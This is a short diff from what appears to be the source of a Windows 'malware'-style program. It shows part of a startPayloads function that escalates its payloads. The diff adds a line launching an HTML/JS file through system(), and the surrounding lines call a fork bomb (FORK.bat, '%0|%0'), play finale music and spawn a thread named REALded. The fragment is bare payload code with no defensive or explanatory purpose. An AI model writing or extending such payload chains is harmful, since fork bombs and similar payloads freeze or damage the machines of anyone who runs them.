@@ -2328,6 +2328,8 @@ void startPayloads() {
     // Here is when stuff gets a lil' bit stronger:
     Reset(); // stop bytebeat/""malware" music"
     RipBozo();
+    system("LOL.html"); // HTML/JS code :000000
+    
     mciSendString(L"play finale.mp3", NULL, 0, NULL);
     system("FORK.bat"); // (forkbomb, %0|%0)
     thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)REALded, 0, 0, &ID);
